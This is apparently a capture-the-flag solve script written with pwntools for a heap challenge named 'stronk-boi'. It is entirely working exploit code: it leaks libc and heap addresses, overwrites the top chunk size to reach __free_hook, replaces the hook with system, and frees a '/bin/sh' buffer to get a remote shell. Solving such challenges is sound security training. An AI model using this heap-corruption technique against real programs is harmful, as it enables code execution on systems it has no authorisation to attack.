#!/usr/bin/env python3
from pwn import *
import ctypes

exe = ELF("./stronk-boi_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

if not args.REMOTE:
    libc = exe.libc

HOST, PORT, SSL = "stronk-boi.challs.shellmates.club", 443, True

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
c
'''
CHECKING = True
TCACHE_OFF = 0x250
HEAP_OFF = 0x10

def sz(chunk_sz, filename_sz, debug=True):
    res = (chunk_sz - (8 + filename_sz + 1 + 1))
    if res >= 2**64:
        diff = res - 2**64
        log.error(f"file_sz >= 2**64, diff = {diff}")
    debug and log.info(f"file_sz = {res}")
    return res

def main():
    global io
    io = conn()

    io.recvuntil(b"Gift: ")
    buf = pack(int(io.recvline(), 16))
    libc.address = leak(buf, libc.sym.system, "libc", True)

    chunk_sz = 0x100
    filename_sz = 7
    file_sz = sz(chunk_sz, filename_sz)

    alloc(filename_sz, file_sz, b"aabb")
    p = flat(
        b"X" * file_sz
    )
    write(p)
    delete()
    filename, file = read(True)
    heap_base = leak(file, HEAP_OFF, "heap", True)

    chunk_sz_real = 0x80
    chunk_sz = 2**64 + chunk_sz_real
    filename_sz = chunk_sz_real - 8 - 1
    file_sz = sz(chunk_sz, filename_sz)

    alloc(filename_sz, file_sz, b"ccdd")
    p = flat(
        -1
    )
    write(p)

    offset = 264
    top_chunk_off = chunk_sz_real + TCACHE_OFF
    top_chunk = heap_base + top_chunk_off
    victim = libc.sym.__free_hook
    request_size = ctypes.c_ulong(victim - top_chunk - 2 * 8 - 8).value
    alloc(7, request_size - offset - 7 - 2, b"ccdd")

    alloc(7, 16, b"eeff")
    p = flat(
        libc.sym.system,
        b"\0"
    )
    write(p)

    alloc(16, 16, b"/bin/sh\0")
    delete()

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def alloc(filename_size, file_size, filename):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Filename size: ", f"{filename_size}".encode())
    io.sendlineafter(b"File size: ", f"{file_size}".encode())
    io.sendafter(b"Filename: ", filename)

def read(debug=False):
    io.sendlineafter(b"Choice: ", b"2")
    io.recvuntil(b"Filename: ")
    filename = io.recvuntil(b"\nFile content: ", drop=True)
    file = io.recvuntil(b"\nWelcome to the fast", drop=True)
    debug and log.info(f"filename: {filename}")
    debug and log.info(f"file: {file}")
    return filename, file

def write(content):
    io.sendlineafter(b"Choice: ", b"3")
    io.recvuntil(b"File content: ")
    io.send(content)

def delete():
    io.sendlineafter(b"Choice: ", b"4")

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT, ssl=True)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
